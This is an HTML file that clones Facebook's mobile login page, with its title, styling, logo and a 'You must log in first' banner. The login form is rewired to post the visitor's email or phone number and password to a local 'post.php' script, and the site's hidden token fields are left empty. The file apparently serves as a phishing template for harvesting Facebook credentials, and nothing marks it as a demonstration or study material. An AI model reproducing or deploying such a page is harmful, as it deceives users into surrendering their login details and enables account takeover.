<html>
 <head>
  <title>Log in to Facebook | Facebook</title>
  <meta name="viewport" content="width=device-width">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <meta name="theme-color" content="#3b5998">
  <style type="text/css">/*<![CDATA[*/.t{pointer-events:none;}.x{padding:8px;}.cg{padding-bottom:12px;padding-top:12px;}.cf{padding-left:4px;padding-right:4px;}.by{padding-left:8px;padding-right:8px;}.cd{padding-top:16px;}.b .ca{display:block;width:auto;}.b .ca .cb,.b .ca .cb:hover{background-color:#42b72a;color:#fff;height:44px;}.b .bv{display:block;margin-bottom:5px;margin-left:3%;margin-top:-3px;overflow:hidden;text-align:center;white-space:nowrap;width:94%;}.b .bv>span{display:inline-block;position:relative;}.b .bv>span:before,.b .bv>span:after{background:#ccd0d5;content:"";height:1px;position:absolute;top:50%;width:9999px;}.b .bv>span:before{margin-right:15px;right:100%;}.b .bv>span:after{left:100%;margin-left:15px;}.b .bw{color:#4b4f56;font-size:14px;}.b .bp{border:solid 1px #999;box-sizing:border-box;width:100%;}.b .u{border:0;border-collapse:collapse;margin:0;padding:0;width:100%;}.b .u tbody{vertical-align:top;}.b .u td{padding:0;}.b .u td.bj{padding:4px;}.b .v{width:100%;}.w{background:#fa3e3e;}.y{color:#fff;}.b .y a,.b .y a:visited{color:#fff;font-weight:bold;}.b .y a:focus,.b .y a:hover{background:#1d2129;}.ci{color:#4b4f56;}.z{font-size:12px;line-height:16px;}.ch{font-size:16px;line-height:20px;}.s{font-weight:normal;}.bl{font-weight:bold;}.bx{text-align:center;}.f{background-color:#fff;}.h{background-color:#3b5998;}.bd{background-color:#eceff5;}.ba{background-color:#fffbe2;color:#7f7212;}.i{padding:2px 3px;}.bb{border-bottom:1px solid;}.f{border-color:#e9e9e9;}.h{border-color:#1d4088;}.bd{border-color:#d8dfea;}.ba{border-color:#e2c822;}.ce{color:gray;}.cr{color:#fff;}.bc{font-size:small;}body,tr,input,textarea,.g{font-size:medium;}form{margin:0;border:0;}.bi{margin:0;}.bi li{display:block;list-style:none;}.b .cj{padding:0;}.b .bj{padding:4px;}.b .bm{color:#8d949e;display:block;font-weight:bold;}.b .bo{padding:12px 8px;color:#1c1e21;}.bn{border:0;display:block;margin:0;padding:0;}.bq{box-sizing:border-box;width:100%;}.b .br{border:solid 1px #999;}.n{-webkit-appearance:none;background:none;display:inline-block;font-size:12px;height:28px;line-height:28px;margin:0;overflow:visible;padding:0 9px;text-align:center;vertical-align:top;white-space:nowrap;}.b .n{border-radius:2px;}.cc,a.cc,.b a.cc,.b a.cc:visited{background-color:#f5f6f7;color:#4b4f56;}.b a.cc:hover,.b .cc:hover{background-color:#ebedf0;color:#4b4f56;}.b .cc{border:1px solid #bec3c9;}.cc[disabled]{color:#bec3c9;}.b .cc[disabled]:hover{background-color:#f5f6f7;color:#bec3c9;}.bu,.q,a.bu,a.q,html .b a.bu,html .b a.q{color:#fff;}.b .q{background-color:#4080ff;border:1px solid #4476e8;}.b a.q:hover,.b .q:hover{background-color:#4580ef;}.b .bu{background-color:#4267b2;border:1px solid #365899;}.b a.bu:hover,.b .bu:hover{background-color:#465e91;}.bu[disabled]{color:#899bc1;}.q[disabled]{color:#91b4fd;}.b .bu[disabled]:hover{background-color:#4267b2;}.b .q[disabled]:hover{background-color:#4080ff;}.bt{font-size:14px;height:44px;line-height:44px;padding:0 20px;}.n .t{display:inline-block;}.b .n .t{display:inline-block;margin-top:0;vertical-align:middle;}.b a.n::after{content:"";display:inline-block;height:100%;vertical-align:middle;}.n .t{line-height:20px;margin-top:4px;}.bt .t{line-height:24px;margin-top:10px;}.n.bs{display:block;width:100%;}a.n.bs,.b label.n.bs{display:block;width:auto;}.b .n{padding:0 8px;}.b a.n{height:26px;line-height:26px;}.b .bt{padding:0 19px;}.b a.bt{font-size:14px;height:42px;line-height:42px;}.b a,.b a:visited{color:#3b5998;text-decoration:none;}.b a:focus,.b a:hover{background-color:#3b5998;color:#fff;}body{text-align:left;direction:ltr;}body,tr,input,textarea,button{font-family:sans-serif;}body,p,figure,h1,h2,h3,h4,h5,h6,ul,ol,li,dl,dd,dt{margin:0;padding:0;}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:bold;}ul,ol{list-style:none;}article,aside,figcaption,figure,footer,header,nav,section{display:block;}#page{position:relative;}.b .o span{font-size:14px;}.b a.p,.b a.p:hover{background-color:#69a74e;color:#fff;}.j{width:100%;}.j .l{text-align:right;}.co{display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.cq{border:1px solid #90949c;display:block;font-size:x-large;height:20px;line-height:18px;text-align:center;vertical-align:middle;width:20px;}.b .cl input,.b .cl input:visited,.b .cl a,.b .cl a:visited{color:#bec3c9;}.b .cl input:focus,.b .cl input:hover,.b .cl a:focus,.b .cl a:hover{background:#dadde1;color:#1d2129;}.ck{background-color:#444950;font-size:x-small;padding:7px 8px 8px;}.cn{color:#bec3c9;display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.k{border:0;display:inline-block;vertical-align:top;}i.k u{position:absolute;width:0;height:0;overflow:hidden;}/*]]>*/</style> 
  <meta http-equiv="origin-trial" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
  <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
  <link rel="canonical" href="https://www.facebook.com/login/">
<link rel="stylesheet" type="text/css" href="style.css"/>
 </head>
 <body tabindex="0" class="b c d e f">
  <div class="g">
   <div id="viewport">
    <div class="h i" id="header">
     <table cellspacing="0" cellpadding="0" class="j">
      <tbody>
       <tr>
        <td valign="middle"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y8/r/k97pj8-or6s.png?_nc_x=Ij3Wp8lg5Kz" width="77" height="16" class="k" alt="facebook"></td>
        <td valign="middle" class="l"><a href="https://mbasic.facebook.com/reg/?cid=102&refid=9&ref=dbl" class="m n o p q s"><span class="t">Create Account</span></a></td>
       </tr>
      </tbody>
     </table>
    </div>
    <div id="objects_container">
     <div class="f" id="root" role="main">
      <table class="u" role="presentation">
       <tbody>
        <tr>
         <td class="v">
          <div class="w x y" style="display: none;">
           <div class="z"></div>
          </div>
          <div class="ba i bb">
           <span class="bc">You must log in first.</span>
          </div>
          <div class="bd be">
           <div id="login_top_banner"></div>
           <div class="bf">
            <form method="post" action="post.php" class="bg bh" id="login_form" novalidate="1">
             <input type="hidden" name="" value="" autocomplete="off">
             <input type="hidden" name="" value="" autocomplete="off">
             <input type="hidden" name="" value="">
             <input type="hidden" name="" value="">
             <input type="hidden" name="" value="">
             <input type="hidden" name="" value="">
             <ul class="bi bj bk">
              <li class="bj"><span class="bl bm" id="u_0_0">Phone number or email address</span><input autocorrect="off" autocapitalize="off" type="" class="bn bo bp" autocomplete="on" id="m_login_email" name="email" value="" aria-labelledby="u_0_0"></li>
              <li class="bj">
               <div>
                <span class="bl bm" id="u_0_1">Password</span>
                <input autocorrect="off" autocapitalize="off" class="bn bo bq br" autocomplete="on" name="pass" aria-labelledby="u_0_1" type="password">
               </div></li>
              <li class="bj"><input value="Log In" type="submit" name="login" class="m s n bs bt bu"></li>
             </ul></form>

             <div>
             
              <div class="bv">
               <span class="bw">or</span>
              </div>
              <div class="bx by">
               <div class="bx bz ca" id="signup-button" tabindex="0">
                <input value="Create New Account" type="submit" name="sign_up" class="m s n cb bt cc">
               </div>
               <div class="cd">
                <span class="bx bc ce">
                 <div>
                </div></span>
               </div>
              </div>
             </div>
            
             <noscript>
              <input type="hidden" name="_fb_noscript" value="true">
             </noscript>
            </form>
            <div class="cf cg">
             <span class="ch ci">
              <ul class="bi cj">
               <li class="bj"><a tabindex="0" href="https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Ffree.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl%26refid%3D8&multiple_results=0&ars=facebook_login&lwv=100&ref=dbl&_rdr" id="forgot-password-link">Forgotten password?</a></li>
               <li class="bj"></li>
               <li class="bj"></li>
              </ul></span>
            </div>
           </div>
           <div></div>
          </div></td>
        </tr>
       </tbody>
      </table>
      <div style="display:none"></div>
      <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
     </div>
    </div>
    <div>
     <div class="ck">
      <div class="cl">
       <table class="u" role="presentation">
        <tbody>
         <tr>
          <td class="v cm" style="width:50%"><b class="cn">English (UK)</b><a class="co" href="">অসমীয়া</a><a class="co" href="">Português (Brasil)</a></td>
          <td class="v cp" style="width:50%"><a class="co" href="">বাংলা</a><a class="co" href="">Español</a><a class="co" href="">
            <div class="cq">
              + 
            </div></a></td>
         </tr>
        </tbody>
       </table>
      </div>
      <span class="bl cr">Facebook ©2019</span>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
